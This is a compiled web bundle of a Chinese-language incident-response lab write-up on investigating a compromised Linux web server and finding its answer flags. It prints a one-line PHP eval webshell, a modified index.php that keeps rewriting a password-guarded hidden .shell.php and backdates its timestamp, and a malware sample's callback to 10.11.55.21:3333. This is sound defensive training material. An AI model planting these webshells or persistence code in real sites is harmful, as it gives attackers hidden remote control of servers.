"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[9229],{35443:(e,n,w)=>{w.r(n),w.d(n,{assets:()=>c,contentTitle:()=>s,default:()=>x,frontMatter:()=>d,metadata:()=>r,toc:()=>l});const r=JSON.parse('{"id":"Xuanji/Unit-1/26","title":"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94 - Linux \u5165\u4fb5\u6392\u67e5","description":"1","source":"@site/docs/Xuanji/Unit-1/26.md","sourceDirName":"Xuanji/Unit-1","slug":"/Xuanji/Unit-1/26","permalink":"/Target-Machines-WriteUp/docs/Xuanji/Unit-1/26","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Xuanji/Unit-1/26.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Xuanji_Sidebar","previous":{"title":"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94 - webshell \u67e5\u6740","permalink":"/Target-Machines-WriteUp/docs/Xuanji/Unit-1/25"},"next":{"title":"\u7b2c\u4e8c\u7ae0 \u65e5\u5fd7\u5206\u6790 - redis \u5e94\u6025\u54cd\u5e94","permalink":"/Target-Machines-WriteUp/docs/Xuanji/Unit-2/22"}}');var a=w(74848),t=w(28453);const d={},s="\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94 - Linux \u5165\u4fb5\u6392\u67e5",c={},l=[{value:"1",id:"1",level:2},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2},{value:"4",id:"4",level:2},{value:"5",id:"5",level:2}];function i(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"\u7b2c\u4e00\u7ae0-\u5e94\u6025\u54cd\u5e94---linux-\u5165\u4fb5\u6392\u67e5",children:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94 - Linux \u5165\u4fb5\u6392\u67e5"})}),"\n",(0,a.jsx)(n.h2,{id:"1",children:"1"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"web \u76ee\u5f55\u5b58\u5728\u6728\u9a6c\uff0c\u8bf7\u627e\u5230\u6728\u9a6c\u7684\u5bc6\u7801\u63d0\u4ea4"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u5217\u51fa ",(0,a.jsx)(n.code,{children:"/var/www/html"})," \u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"root@ip-10-0-10-4:/var/www/html# ls -lah\ntotal 736K\ndrwxrwxrwx 8 www-data www-data 4.0K Aug  3  2023  .\ndrwxr-xr-x 3 root     root     4.0K Aug  3  2023  ..\n-rwxrwxrwx 1 www-data www-data   24 Aug  3  2023  1.php\n-rw-r--r-- 1 root     root     640K Aug  3  2023  1.tar\ndrwxrwxrwx 3 www-data www-data 4.0K Aug  3  2023  admin\n-rwxrwxrwx 1 www-data www-data  280 Aug  3  2023  api.php\n-rwxrwxrwx 1 www-data www-data  882 Aug  3  2023  config.php\ndrwxrwxrwx 3 www-data www-data 4.0K Aug  3  2023  data\n-rwxrwxrwx 1 www-data www-data  894 Aug  3  2023  favicon.ico\n-rwxrwxrwx 1 www-data www-data  142 Aug  3  2023  .htaccess\ndrwxrwxrwx 4 www-data www-data 4.0K Aug  3  2023  include\n-rwxrwxrwx 1 root     root      722 Aug  3  2023  index.php\n-rwxrwxrwx 1 www-data www-data  13K Aug  3  2023  install.php\n-rwxrwxrwx 1 www-data www-data 1.1K Aug  3  2023  LICENSE\ndrwxrwxrwx 2 www-data www-data 4.0K Aug  3  2023  pictures\n-rwxrwxrwx 1 www-data www-data 2.2K Aug  3  2023  README.md\n-rwxrwxrwx 1 www-data www-data 1.1K Aug  3  2023  rss.php\n-rw-r--r-- 1 www-data www-data  207 Aug  3  2023 'shell(1).elf'\n-rw-r--r-- 1 www-data www-data   88 Jan  1  2021  .shell.php\n-rwxrwxrwx 1 www-data www-data  566 Aug  3  2023  sitemap.php\ndrwxrwxrwx 3 www-data www-data 4.0K Aug  3  2023  template\ndrwxrwxrwx 3 www-data www-data 4.0K Aug  3  2023  wap\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u76f8\u8f83\u4e8e\u4f20\u7edf\u7684 web \u670d\u52a1\u7aef\u6e90\u7801\uff0c\u5176 ",(0,a.jsx)(n.code,{children:"1.php"})," \u6587\u4ef6\u540d\u5c24\u4e3a\u53ef\u7591\uff0c\u67e5\u770b\u5176\u6587\u4ef6\u5185\u5bb9"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",metastring:'title="1.php"',children:"<?php eval($_POST[1]);?>\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u77e5\u6728\u9a6c\u7684\u8fde\u63a5\u5bc6\u7801"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-flag",children:"flag{1}\n"})}),"\n",(0,a.jsx)(n.h2,{id:"2",children:"2"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u670d\u52a1\u5668\u7591\u4f3c\u5b58\u5728\u4e0d\u6b7b\u9a6c\uff0c\u8bf7\u627e\u5230\u4e0d\u6b7b\u9a6c\u7684\u5bc6\u7801\u63d0\u4ea4"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u6587\u4ef6\u7684\u4fee\u6539\u65f6\u95f4\u90fd\u4e00\u6837\uff0c\u4f46\u662f ",(0,a.jsx)(n.code,{children:"index.php"})," \u6587\u4ef6\u7684\u6743\u9650\u660e\u663e\u4e0e\u5176\u4ed6\u6587\u4ef6\u4e0d\u540c\uff0c\u4e3a ",(0,a.jsx)(n.code,{children:"root"})]}),"\n",(0,a.jsxs)(n.p,{children:["\u67e5\u770b ",(0,a.jsx)(n.code,{children:"index.php"})," \u6587\u4ef6\u7684\u5185\u5bb9"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",metastring:'title="index.php"',children:"<?php\ninclude('config.php');\ninclude(SYS_ROOT.INC.'common.php');\n$path=$_SERVER['PATH_INFO'].($_SERVER['QUERY_STRING']?'?'.str_replace('?','',$_SERVER['QUERY_STRING']):'');\nif(substr($path, 0,1)=='/'){\n        $path=substr($path,1);\n}\n$path = Base::safeword($path);\n$ctrl=isset($_GET['action'])?$_GET['action']:'run';\nif(isset($_GET['createprocess']))\n{\n        Index::createhtml(isset($_GET['id'])?$_GET['id']:0,$_GET['cat'],$_GET['single']);\n}else{\n        Index::run($path);\n}\n$file = '/var/www/html/.shell.php';\n$code = '<?php if(md5($_POST[\"pass\"])==\"5d41402abc4b2a76b9719d911017c592\"){@eval($_POST[cmd]);}?>';\nfile_put_contents($file, $code);\nsystem('touch -m -d\"2021-01-01 00:00:01\".shell.php');\nusleep(3000);\n?>\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5f88\u660e\u663e\uff0c\u5b58\u5728\u6709\u5f80 ",(0,a.jsx)(n.code,{children:".shell.php"})," \u6587\u4ef6\u5199\u5165 webshel \u7684\u64cd\u4f5c\uff0c\u5176 webshell \u6e90\u7801\u4e3a"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",metastring:"title=webshell",children:'<?php if(md5($_POST["pass"])=="5d41402abc4b2a76b9719d911017c592"){@eval($_POST[cmd]);}?>\n'})}),"\n",(0,a.jsxs)(n.p,{children:["\u7531\u4e8e\u6bcf\u4e00\u6b21\u8bbf\u95ee\u670d\u52a1\u7aef\uff0c\u90fd\u8981\u8bbf\u95ee ",(0,a.jsx)(n.code,{children:"index.php"})," \u6587\u4ef6\uff0c\u90a3\u4e48 ",(0,a.jsx)(n.code,{children:".shell.php"})," \u6587\u4ef6\u5c31\u4f1a\u4e00\u76f4\u88ab\u521b\u5efa\uff0c\u5373\u53ef\u4e00\u5b9a\u610f\u4e49\u4e0a\u5b9e\u73b0\u4e0d\u6b7b\u7684\u6548\u679c"]}),"\n",(0,a.jsxs)(n.p,{children:["\u57fa\u4e8e php \u4ee3\u7801 ",(0,a.jsx)(n.code,{children:'md5($_POST["pass"])=="5d41402abc4b2a76b9719d911017c592"'})," \u7684\u903b\u8f91\uff0c\u5c06 MD5 \u54c8\u5e0c\u8fdb\u884c\u53cd\u67e5\u5f69\u8679\u8868\uff0c\u5373\u53ef\u77e5\u9053\u8fde\u63a5\u5bc6\u7801\u4e3a ",(0,a.jsx)(n.code,{children:"hello"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-flag",children:"flag{hello}\n"})}),"\n",(0,a.jsx)(n.h2,{id:"3",children:"3"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u4e0d\u6b7b\u9a6c\u662f\u901a\u8fc7\u54ea\u4e2a\u6587\u4ef6\u751f\u6210\u7684\uff0c\u8bf7\u63d0\u4ea4\u6587\u4ef6\u540d"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u7531\u4e0a\u4e00\u9898\u53ef\u4ee5\u5f97\u77e5\uff0c\u4e0d\u6b7b\u9a6c ",(0,a.jsx)(n.code,{children:".shell.php"})," \u6587\u4ef6\u662f\u7531 ",(0,a.jsx)(n.code,{children:"index.php"})," \u6587\u4ef6\u521b\u5efa\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u5f97\u5230\u7b54\u6848"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-flag",children:"flag{index.php}\n"})}),"\n",(0,a.jsx)(n.h2,{id:"4",children:"4"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u9ed1\u5ba2\u7559\u4e0b\u4e86\u6728\u9a6c\u6587\u4ef6\uff0c\u8bf7\u627e\u51fa\u9ed1\u5ba2\u7684\u670d\u52a1\u5668 ip \u63d0\u4ea4"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u7ee7\u7eed\u67e5\u770b\u653b\u51fb\u8005\u53ef\u80fd\u4e0a\u4f20\u7684\u76ee\u5f55 ",(0,a.jsx)(n.code,{children:"/var/www/html"})," \u4ee5\u53ca ",(0,a.jsx)(n.code,{children:"/tmp"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"root@ip-10-0-10-4:/var/www/html# ls -lah\ntotal 736K\ndrwxrwxrwx 8 www-data www-data 4.0K Aug  3  2023  .\ndrwxr-xr-x 3 root     root     4.0K Aug  3  2023  ..\n-rwxrwxrwx 1 www-data www-data   24 Aug  3  2023  1.php\n-rw-r--r-- 1 root     root     640K Aug  3  2023  1.tar\ndrwxrwxrwx 3 www-data www-data 4.0K Aug  3  2023  admin\n-rwxrwxrwx 1 www-data www-data  280 Aug  3  2023  api.php\n-rwxrwxrwx 1 www-data www-data  882 Aug  3  2023  config.php\ndrwxrwxrwx 3 www-data www-data 4.0K Aug  3  2023  data\n-rwxrwxrwx 1 www-data www-data  894 Aug  3  2023  favicon.ico\n-rwxrwxrwx 1 www-data www-data  142 Aug  3  2023  .htaccess\ndrwxrwxrwx 4 www-data www-data 4.0K Aug  3  2023  include\n-rwxrwxrwx 1 root     root      722 Aug  3  2023  index.php\n-rwxrwxrwx 1 www-data www-data  13K Aug  3  2023  install.php\n-rwxrwxrwx 1 www-data www-data 1.1K Aug  3  2023  LICENSE\ndrwxrwxrwx 2 www-data www-data 4.0K Aug  3  2023  pictures\n-rwxrwxrwx 1 www-data www-data 2.2K Aug  3  2023  README.md\n-rwxrwxrwx 1 www-data www-data 1.1K Aug  3  2023  rss.php\n-rw-r--r-- 1 www-data www-data  207 Aug  3  2023 'shell(1).elf'\n-rw-r--r-- 1 www-data www-data   88 Jan  1  2021  .shell.php\n-rwxrwxrwx 1 www-data www-data  566 Aug  3  2023  sitemap.php\ndrwxrwxrwx 3 www-data www-data 4.0K Aug  3  2023  template\ndrwxrwxrwx 3 www-data www-data 4.0K Aug  3  2023  wap\n\nroot@ip-10-0-10-4:/var/www/html# ls -lah /tmp/\ntotal 36K\ndrwxrwxrwt  9 root root 4.0K Oct  1 08:09 .\ndrwxr-xr-x 18 root root 4.0K Oct  1 08:01 ..\ndrwxrwxrwt  2 root root 4.0K Oct  1 08:01 .font-unix\ndrwxrwxrwt  2 root root 4.0K Oct  1 08:01 .ICE-unix\ndrwx------  3 root root 4.0K Oct  1 08:01 systemd-private-556ceaa0b7d640a194d01e0c1d5a943e-apache2.service-EqvlaG\ndrwx------  3 root root 4.0K Oct  1 08:01 systemd-private-556ceaa0b7d640a194d01e0c1d5a943e-ntp.service-LiXjoD\ndrwxrwxrwt  2 root root 4.0K Oct  1 08:01 .Test-unix\ndrwxrwxrwt  2 root root 4.0K Oct  1 08:01 .X11-unix\ndrwxrwxrwt  2 root root 4.0K Oct  1 08:01 .XIM-unix\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u5176\u4e2d\u53ef\u4ee5\u6ce8\u610f\u5230\u53ef\u7591 ",(0,a.jsx)(n.code,{children:"/var/www/html/shell(1).elf"})," \u6587\u4ef6\uff0c\u57fa\u672c\u53ef\u4ee5\u65ad\u5b9a\u6b64\u4e3a\u653b\u51fb\u8005\u7684\u6728\u9a6c\u6587\u4ef6"]}),"\n",(0,a.jsx)(n.p,{children:"\u4f7f\u7528\u5fae\u6b65\u4e91\u6c99\u7bb1\u8fdb\u884c\u5206\u6790"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.a,{href:"https://s.threatbook.com/report/file/f176896a421ec411a08aad8ae4592c51609ff95e140c8f3bbe4160424f79ff5d",children:"\u6837\u672c\u62a5\u544a - \u5fae\u6b65\u5728\u7ebf\u4e91\u6c99\u7bb1"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u7f51\u7edc\u884c\u4e3a\u90e8\u5206\uff0c\u53ef\u4ee5\u6ce8\u610f\u5230\u6c99\u7bb1\u73af\u5883\u5411 ",(0,a.jsx)(n.code,{children:"10.11.55.21"})," \u53d1\u8d77\u4e86 TCP \u8bf7\u6c42"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-flag",children:"flag{10.11.55.21}\n"})}),"\n",(0,a.jsx)(n.h2,{id:"5",children:"5"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u9ed1\u5ba2\u7559\u4e0b\u4e86\u6728\u9a6c\u6587\u4ef6\uff0c\u8bf7\u627e\u51fa\u9ed1\u5ba2\u670d\u52a1\u5668\u5f00\u542f\u7684\u76d1\u7aef\u53e3\u63d0\u4ea4"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u624b\u52a8\u6267\u884c ",(0,a.jsx)(n.code,{children:"/var/www/html/shell(1).elf"})," \u6837\u672c\u4e4b\u540e\uff0c\u76f4\u63a5\u4f7f\u7528 ",(0,a.jsx)(n.code,{children:"netstat -alnop"})," \u811a\u672c\u67e5\u770b\u76d1\u542c\u7aef\u53e3"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"root@ip-10-0-10-4:/var/www/html# ./shell\\(1\\).elf &\n[1] 25691\nroot@ip-10-0-10-4:/var/www/html# netstat -alnop\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      540/mysqld           off (0.00/0/0)\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      472/sshd             off (0.00/0/0)\ntcp        0      0 10.0.10.4:22            120.35.33.11:58144      ESTABLISHED 961/sshd: root@nott  keepalive (5663.12/0/0)\ntcp        0      1 10.0.10.4:59968         10.11.55.21:3333        SYN_SENT    25691/./shell(1).el  on (3.28/2/0)\ntcp        0    340 10.0.10.4:22            120.35.33.11:56644      ESTABLISHED 824/sshd: root@pts/  on (0.22/0/0)\ntcp6       0      0 :::80                   :::*                    LISTEN      523/apache2          off (0.00/0/0)\ntcp6       0      0 :::22                   :::*                    LISTEN      472/sshd             off (0.00/0/0)\nudp        0      0 0.0.0.0:68              0.0.0.0:*                           334/dhclient         off (0.00/0/0)\nudp        0      0 10.0.10.4:123           0.0.0.0:*                           451/ntpd             off (0.00/0/0)\nudp        0      0 127.0.0.1:123           0.0.0.0:*                           451/ntpd             off (0.00/0/0)\nudp        0      0 0.0.0.0:123             0.0.0.0:*                           451/ntpd             off (0.00/0/0)\nudp6       0      0 fe80::f0:ccff:fe9d::123 :::*                                451/ntpd             off (0.00/0/0)\nudp6       0      0 ::1:123                 :::*                                451/ntpd             off (0.00/0/0)\nudp6       0      0 :::123                  :::*                                451/ntpd             off (0.00/0/0)\n......\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u5230\uff0c\u6076\u610f\u6837\u672c\u5411 ",(0,a.jsx)(n.code,{children:"10.11.55.21:3333"})," \u53d1\u8d77\u4e86\u7f51\u7edc\u8bf7\u6c42\uff0c\u7ed3\u5408\u4e0a\u4e00\u6b65\u653b\u51fb\u8005\u670d\u52a1\u5668 IP \u5373\u53ef\u5f97\u77e5\u7b54\u6848"]}),"\n",(0,a.jsx)(n.p,{children:"\u8fd8\u6709\u4e00\u4e2a\u53d6\u5de7\u7684\u529e\u6cd5\uff0c\u5c31\u662f\u5728\u5fae\u6b65\u4e91\u6c99\u7bb1\u91cc\u9762\u76f4\u63a5\u4e0b\u8f7d\u7f51\u7edc\u884c\u4e3a\u6355\u83b7"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:w(24112).A+"",width:"1905",height:"1019"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u6355\u83b7\u6587\u4ef6\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u770b\u5230\u6c99\u7bb1\u73af\u5883\u5411 ",(0,a.jsx)(n.code,{children:"10.11.55.21:3333"})," \u8fd9\u4e2a\u5730\u5740\u53d1\u8d77\u8bf7\u6c42\u7684\u8bb0\u5f55"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:w(83448).A+"",width:"1832",height:"1199"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-flag",children:"flag{3333}\n"})})]})}function x(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(i,{...e})}):i(e)}},24112:(e,n,w)=>{w.d(n,{A:()=>r});const r=w.p+"assets/images/image_20241045-164548-ee1ceb837d2bc8345b81c8579f79ced4.png"},83448:(e,n,w)=>{w.d(n,{A:()=>r});const r=w.p+"assets/images/image_20241046-164642-0af9008386a82bab545367956ab264d3.png"},28453:(e,n,w)=>{w.d(n,{R:()=>d,x:()=>s});var r=w(96540);const a={},t=r.createContext(a);function d(e){const n=r.useContext(t);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function s(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:d(e.components),r.createElement(t.Provider,{value:n},e.children)}}}]);